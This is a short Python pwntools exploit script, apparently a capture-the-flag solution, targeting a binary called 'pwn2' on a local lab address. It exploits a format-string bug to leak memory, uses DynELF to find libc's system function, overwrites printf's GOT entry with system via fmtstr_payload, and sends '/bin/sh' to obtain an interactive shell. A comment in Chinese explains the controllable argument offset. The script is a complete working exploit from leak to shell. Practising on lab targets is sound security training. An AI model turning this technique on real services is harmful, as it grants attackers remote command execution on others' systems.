#!/usr/bin/python
#coding:utf-8

from pwn import *

io = remote('172.17.0.2', 10001)
context.update(arch = 'i386', os = 'linux')
elf = ELF('./pwn2')

printf_got = elf.got['printf']

def leak(addr):
	payload = '%8$s'
	payload += p32(addr)
	io.send(payload)
	content = io.recv()
	if(len(content) == 4):
		print '[*] NULL'
		return '\x00'
	else:
		print '[*] %#x ---> %s' % (addr, (content[0:-4] or '').encode('hex'))
		return content[0:-4]

d = DynELF(leak, elf = elf)
system_addr = d.lookup('system', 'libc')
log.info('system_addr:' + hex(system_addr))

payload = fmtstr_payload(7, {printf_got: system_addr})				#fmtstr_payload(offset, {write_addr:write_data})第7个参数可以被我们控制
io.sendline(payload)
io.sendline('/bin/sh\x00')

io.interactive()